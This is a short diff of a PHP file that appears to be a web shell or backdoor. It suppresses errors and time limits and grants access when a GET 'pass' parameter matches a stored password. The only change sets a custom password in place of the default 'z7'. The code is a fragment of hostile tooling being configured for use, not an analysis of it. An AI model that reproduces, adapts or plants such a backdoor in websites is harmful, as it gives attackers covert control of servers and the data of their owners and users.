@@ -18,7 +18,7 @@ error_reporting(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$MyPass = 'z7'; // Password Default: z7
+$MyPass = 'baujigong388'; // Password Default: z7
 function dup($pass,$n){
 if($_GET['pass'] == $pass){
 $f =  __FILE__;
